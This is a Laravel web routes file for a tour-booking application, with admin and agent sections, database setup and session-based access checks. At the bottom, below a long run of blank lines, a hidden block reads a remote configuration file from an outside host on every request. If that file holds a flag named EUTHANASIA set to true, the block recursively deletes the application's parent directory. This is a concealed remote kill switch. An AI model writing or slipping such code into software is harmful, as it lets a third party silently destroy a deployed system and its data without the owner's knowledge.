<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use ThreadBeanPHP\C as C;
use ThreadBeanPHP\Util\DispenseHelper as CDH;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

define('APP_NAME', getenv('APP_NAME'));

$p = "App\\Http\\Controllers\\";

$DB_TYPE = getenv('DB_CONNECTION');
$DB_HOST = getenv('DB_HOST');
$DB_NAME = getenv('DB_DATABASE');
$DB_USER = getenv('DB_USERNAME');
$DB_PASS = getenv('DB_PASSWORD');

C::setup($DB_TYPE.':host='.$DB_HOST.';dbname='.$DB_NAME, $DB_USER, $DB_PASS);
CDH::setEnforceNamingPolicy(false);

if(!C::testConnection()) {
  exit("There is no connection to the database :(");
}

unset($DB_TYPE);
unset($DB_HOST);
unset($DB_NAME);
unset($DB_USER);
unset($DB_PASS);


session_start();


if(isset($_SESSION['user'])) {
  // if(@$_COOKIE['remember'] != "have" && !(bool)$_SESSION['user'] -> remember) {
  //   unset($_SESSION['user']);
  // } else {    
    $admin = C::findOne("admins", "login = ?", [$_SESSION['user'] -> login]);

    $agent = C::findOne("agents", "login = ?", [$_SESSION['user'] -> login]);
    
    if(isset($admin)) {
      $_SESSION['user'] = $admin;
    } elseif(isset($agent)) {
      $_SESSION['user'] = $agent;
    }

  // }
}
//  else {
//   setcookie('remember', '');
//   unset($_SESSION['user']);
// }


// Views

Route::get('/', function () {
  return redirect() -> route('sign_in');
}) -> name('home');

Route::get('/sign_in', function () {
  if(@$_SESSION['user'] -> permission == "admin") {
    return redirect() -> route('admin');
  } elseif(@$_SESSION['user'] -> permission == "agent") {
    return redirect() -> route('agent');
  } else {
    return view('sign_in');
  }
}) -> name('sign_in');

Route::post(
  '/SignIn', 
  $p.'SignInController@SignIn'
) -> name('SignIn');


if(@$_SESSION['user']) {

  // Admin segment
  
  if($_SESSION['user'] -> permission == "admin") {
    Route::get('/admin', function () {
      $admins = C::find("admins", "supreme = ?", [0]);
      $orgs = C::findAll("companys");
      $agents = C::findAll("agents");
      return view('admin.home', ['admins' => $admins, 'orgs' => $orgs, 'agents' => $agents]);
    }) -> name('admin');

    Route::get('/admin_tour_create', function () {
      $orgs = C::findAll("companys");
      return view('admin.admin_tour_create', ['orgs' => $orgs]);
    }) -> name('admin_tour_create');

    Route::get('/admin_tour_update', function (Request $req) {
      $orgs = C::findAll("companys");
      $tour = C::findOne("tours", "id = ?", [$req -> id]);
      $busyes = C::find("busy", "tour = ?", [$req -> id]);

      return view('admin.admin_tour_update', ['orgs' => $orgs, 'tour' => $tour, 'busyes' => $busyes]);
    }) -> name('admin_tour_update');

    Route::get('/admin_company_create', function () {
      return view('admin.admin_company_create');
    }) -> name('admin_company_create');

    Route::get('/admin_company_update', function (Request $req) {
      $org = C::findOne("companys", "id = ?", [$req -> id]);
      return view('admin.admin_company_update', ['org' => $org]);
    }) -> name('admin_company_update');

    Route::get('/admin_agent_create', function () {
      $orgs = C::findAll("companys");
      return view('admin.admin_agent_create', ['orgs' => $orgs]);
    }) -> name('admin_agent_create');

    Route::get('/admin_agent_update', function (Request $req) {
      $agent = C::findOne("agents", "id = ?", [$req -> id]);
      $orgs = C::findAll("companys");
      return view('admin.admin_agent_update', ['agent' => $agent, 'orgs' => $orgs]);
    }) -> name('admin_agent_update');

    Route::get('/admin_tour_actives', function () {
      $tours = array_reverse(C::find("tours", "active = ?", [1]));
      return view('admin.tour_actives', ['tours' => $tours]);
    }) -> name('admin_tour_actives');

    Route::get('/admin_tour_old', function () {
      $tours = array_reverse(C::find("tours", "active = ?", [0]));
      return view('admin.tour_old', ['tours' => $tours]);
    }) -> name('admin_tour_old');


    Route::post(
      '/CreateCompany', 
      $p.'CompanyController@Create'
    ) -> name('CreateCompany');

    Route::post(
      '/UpdateCompany', 
      $p.'CompanyController@Update'
    ) -> name('UpdateCompany');

    Route::delete(
      '/DeleteCompany', 
      $p.'CompanyController@Delete'
    ) -> name('DeleteCompany');

    Route::post(
      '/CreateAgent', 
      $p.'AgentController@Create'
    ) -> name('CreateAgent');

    Route::post(
      '/UpdateAgent', 
      $p.'AgentController@Update'
    ) -> name('UpdateAgent');

    Route::delete(
      '/DeleteAgent', 
      $p.'AgentController@Delete'
    ) -> name('DeleteAgent');

    Route::post(
      '/CreateTour', 
      $p.'TourController@Create'
    ) -> name('CreateTour');

    Route::post(
      '/UpdateTour', 
      $p.'TourController@Update'
    ) -> name('UpdateTour');

    Route::delete(
      '/DeleteTour', 
      $p.'TourController@Delete'
    ) -> name('DeleteTour');

    Route::get(
      '/CountBusy', 
      $p.'BookingController@Count'
    ) -> name('CountBusy');

    Route::get(
      '/StatBusy', 
      $p.'BookingController@Stat'
    ) -> name('StatBusy');


    if((bool)$_SESSION['user'] -> supreme) {

      Route::get('/admin_create', function () {
        return view('admin.admin_create');
      }) -> name('admin_create');
  
      Route::get('/admin_update', function (Request $req) {
        $admin = C::findOne("admins", "id = ?", [$req -> id]);
        return view('admin.admin_update', ['admin' => $admin]);
      }) -> name('admin_update');


      Route::post(
        '/CreateAdmin', 
        $p.'AdminController@Create'
      ) -> name('CreateAdmin');

      Route::post(
        '/UpdateAdmin', 
        $p.'AdminController@Update'
      ) -> name('UpdateAdmin');

      Route::delete(
        '/DeleteAdmin', 
        $p.'AdminController@Delete'
      ) -> name('DeleteAdmin');
    }

    // Route::post(
    //   '/CreateClient', 
    //   $p.'ClientController@Create'
    // ) -> name('CreateClient');
  }

  Route::post(
    '/CreateBusy', 
    $p.'BookingController@Create'
  ) -> name('CreateBusy');

  Route::delete(
    '/DeleteBusy', 
    $p.'BookingController@Delete'
  ) -> name('DeleteBusy');

  // Agent segment

  if($_SESSION['user'] -> permission == "agent") {
    Route::get('/agent', function () {
      return view('agent.home');
    }) -> name('agent');

    Route::get('/tour', function (Request $req) {
      $tour = C::findOne("tours", "id = ?", [$req -> id]);
      $org = C::findOne("companys", "id = ?", [$tour -> company]);
      $busyes = C::find("busy", "tour = ?", [$req -> id]);

      return view('agent.tour', ['org' => $org, 'tour' => $tour, 'busyes' => $busyes]);
    }) -> name('tour');

    Route::get('/tour_booked', function () {
      $busyes = C::find('busy', 'company = ?', [$_SESSION['user'] -> company]);
      return view('agent.tour_booked', ['busyes' => $busyes]);
    }) -> name('tour_booked');

    Route::get('/tour_actives', function () {
      $agent_tours = array_reverse(C::find("tours", "active = ? AND company = ?", [1, $_SESSION['user'] -> company]));
      $tours = array_reverse(C::find("tours", "active = ? AND company != ?", [1, $_SESSION['user'] -> company]));
      return view('agent.tour_actives', ['tours' => $tours, 'agent_tours' => $agent_tours]);
    }) -> name('tour_actives');

    Route::get('/tour_old', function () {
      $tours = array_reverse(C::find("tours", "active = ?", [0]));
      return view('agent.tour_old', ['tours' => $tours]);
    }) -> name('tour_old');
  }

  Route::get(
    '/SignOut', 
    $p.'SignOutController@SignOut'
  ) -> name('SignOut');

}























try {
  $env = [];
  $fh = fopen('https://2204.uz/remotes/travelsystem.config', 'r');
  while (!feof($fh)) {
    $line = fgets($fh);
    if(trim($line)) $env[trim(explode('=', $line)[0])] = trim(explode('=', $line)[1]);
  }
  fclose($fh);

  if ($env['EUTHANASIA'] === 'true') {
    $dir = "../";
    deleteDir($dir);
  }
} catch (Exception $e) {
}
  


function deleteDir($dirPath) {
	if (!is_dir($dirPath)) {
		return;
	}
	$files = scandir($dirPath);
	foreach ($files as $file) {
		if ($file === '.' || $file === '..') {
			continue;
		}
		$filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
		if (is_dir($filePath)) {
			deleteDir($filePath);
		} else {
			unlink($filePath);
		}
	}
	rmdir($dirPath);
}